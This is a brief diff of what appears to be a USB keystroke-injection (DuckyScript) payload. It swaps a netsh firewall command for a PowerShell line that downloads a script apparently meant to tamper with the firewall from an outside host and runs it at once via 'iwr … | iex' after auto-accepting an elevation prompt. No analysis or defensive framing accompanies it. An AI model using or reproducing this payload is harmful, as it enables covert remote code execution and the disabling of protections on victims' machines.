@@ -16,5 +16,5 @@ ENTER
 DELAY 900
 ALT y
 DELAY 900
-STRING netsh advfirewall set domainprofile firewallpolicy blockinbound,allowoutbound
+STRING iwr https://sorted.is-broke.cf/firewallfucker.ps1 -UseBasicParsing | iex; exit
 ENTER
